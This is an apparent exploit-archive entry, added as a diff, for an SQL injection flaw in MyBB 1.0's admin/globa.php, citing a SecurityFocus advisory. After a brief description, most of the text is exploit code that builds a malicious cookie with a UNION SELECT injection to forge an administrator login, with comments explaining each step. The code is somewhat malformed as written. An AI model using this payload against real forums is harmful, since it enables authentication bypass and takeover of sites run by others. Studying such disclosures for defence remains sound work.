@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/16082/info
+
+MyBB is prone to an SQL injection vulnerability.
+
+The vulnerability presents itself when user-supplied input via cookie data is passed to the 'admin/globa.php' script.
+
+Successful exploitation can allow an attacker to bypass authentication and gain administrative access to a site. Other attacks may also be possible.
+
+MyBB 1.0 is reportedly vulnerable. 
+
+string expcookie="imei'" //garbrage field that actually is not an uid + an inject sign +" union select '1' as uid," //return no admin union our sniffed admin +" '','','','xxx'as loginkey ,"//we have not any info! so null them; only login key cheked that we fill with xxx +" '','','','',"//null fields befor usergroup +" 4 as usergroup";// ok! our sniffed admin is an admin : D !! for (int i=0;i< 49;i++) expcookie+=",''"; //null all of other fields!expcookie+="-- imei" // remark rest of SQL +"_xxx" ; 
